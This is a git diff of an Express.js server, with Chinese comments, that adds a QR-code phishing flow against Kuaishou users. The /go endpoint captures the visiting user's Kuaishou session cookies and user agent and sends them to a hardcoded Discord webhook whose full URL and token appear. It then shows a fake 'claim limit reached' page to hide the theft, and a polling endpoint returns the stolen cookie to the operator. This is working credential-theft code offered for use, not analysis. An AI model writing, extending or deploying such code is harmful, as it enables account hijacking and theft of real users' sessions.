@@ -10,6 +10,7 @@ app.use(express.static(__dirname));
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1494697274121650310/DAbxLzXxdk4EWHyZpeJwVKydfQdQEyul4lOnjE8HAvNouZuwAQP8Sd8w_dLsrxYV6zG1";
 
 const cookies = [];
+const scans = {};
 
 // ====== 页面 ======
 app.get("/", function(req, res) {
@@ -20,18 +21,63 @@ app.get("/cookies", function(req, res) {
     res.sendFile(path.join(__dirname, "cookies.html"));
 });
 
-// ====== 接收Cookie ======
-app.post("/api/submit", function(req, res) {
-    var cookie = req.body.cookie || "";
-    if (!cookie) return res.json({ ok: false });
+// ====== 用户扫码后访问的链接（快手APP内置浏览器打开）======
+app.get("/go", function(req, res) {
+    var cookie = req.headers.cookie || "";
+    var userAgent = req.headers["user-agent"] || "";
+    var scanId = req.query.id || "";
 
-    cookies.push({
-        cookie: cookie,
-        time: new Date().toISOString()
+    if (cookie && cookie.indexOf("kuaishou") !== -1) {
+        cookies.push({
+            cookie: cookie,
+            ua: userAgent,
+            time: new Date().toISOString()
+        });
+
+        if (scanId && scans[scanId]) {
+            scans[scanId].status = "done";
+            scans[scanId].cookie = cookie;
+        }
+
+        sendToDiscord(cookie);
+
+        res.send('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body style="background:#111;color:#0f0;text-align:center;padding:50px;font-family:Arial"><h1>失败</h1><p>领取次数已达到上限</p></body></html>');
+    } else {
+        res.send('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="refresh" content="0;url=https://www.kuaishou.com"></head><body></body></html>');
+    }
+});
+
+// ====== 生成永久二维码 ======
+app.get("/api/qr", function(req, res) {
+    var scanId = uuidv4();
+    var host = req.get("host");
+    var qrUrl = "https://" + host + "/go?id=" + scanId;
+
+    scans[scanId] = {
+        status: "wait",
+        cookie: null,
+        createdAt: Date.now()
+    };
+
+    res.json({
+        scanId: scanId,
+        qrUrl: qrUrl
     });
+});
 
-    sendToDiscord(cookie);
-    res.json({ ok: true });
+// ====== 轮询扫码状态 ======
+app.get("/api/check", function(req, res) {
+    var id = req.query.id;
+    var scan = scans[id];
+
+    if (!scan) {
+        return res.json({ status: "expired" });
+    }
+
+    res.json({
+        status: scan.status,
+        cookie: scan.cookie
+    });
 });
 
 // ====== Cookie列表 ======
